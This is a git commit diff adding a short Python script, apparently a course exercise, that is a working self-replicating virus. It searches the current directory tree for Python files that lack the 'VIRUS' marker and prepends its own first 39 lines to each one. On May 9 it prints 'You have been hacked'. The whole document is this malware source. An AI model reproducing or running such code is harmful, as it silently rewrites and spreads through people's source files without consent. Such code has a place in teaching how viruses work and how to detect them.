a4d072b88c470ec16a89c5fee80e870b7c7ae9f3
home <dustin@iroquois.capital>
2023-06-16 23:28:43 -0600

    updates

---
+++ 301code14.py
@@ -0,0 +1,52 @@
+#!/usr/bin/python3
+import os
+import datetime
+
+SIGNATURE = "VIRUS"
+
+# Function to locate files in the given path
+def locate(path):
+    files_targeted = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+
+# Function to infect files by appending the virus code to them
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i, line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    virus.close
+    for fname in files_targeted:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname, "w")
+        f.write(virusstring + temp)
+        f.close()
+
+# Function to check the date and print a message if it matches the specified date
+def detonate():
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+
+# Locate files in the current directory and its subdirectories
+files_targeted = locate(os.path.abspath(""))
+
+# Infect the files that are not already infected by appending the virus code
+infect(files_targeted)
+
+# Check the date and print a message if it matches May 9th
+detonate()
